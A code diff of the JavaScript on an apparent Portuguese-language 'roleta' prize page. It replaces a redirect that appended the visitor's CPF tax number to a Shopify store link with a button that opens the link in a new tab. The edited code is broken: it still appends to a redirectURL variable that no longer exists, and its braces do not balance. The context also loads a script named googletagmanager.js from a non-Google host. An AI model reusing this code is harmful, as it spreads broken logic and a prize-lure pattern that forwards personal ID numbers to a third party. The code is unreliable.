@@ -192,21 +192,17 @@
       }
   }
 
-  // Constrói a URL de redirecionamento
-                var redirectURL = 'https://e6c4c0-92.myshopify.com/collections/roleta?cpf=' + encodeURIComponent(numeroCPF);
-    
+  // Ação do botão "Aproveitar meu prêmio"
+  prizeBtn.onclick = function() {
+      window.open('https://e6c4c0-92.myshopify.com/collections/roleta', '_blank').focus();
+
                 // Adiciona parâmetros existentes na URL atual à nova URL
                 var parametrosAtuais = window.location.search.substring(1);
                 if (parametrosAtuais) {
                     redirectURL += '&' + parametrosAtuais;
-                }
     
-                // Redireciona para a URL construída
-                window.location.href = redirectURL;
-            });
-            </script>
-
-
+  }
+</script>
 
                     <script async="true" src="https://c1.cdn1tp.net/ghelper/googletagmanager.js"></script>
 <!-- Meta Pixel Code -->
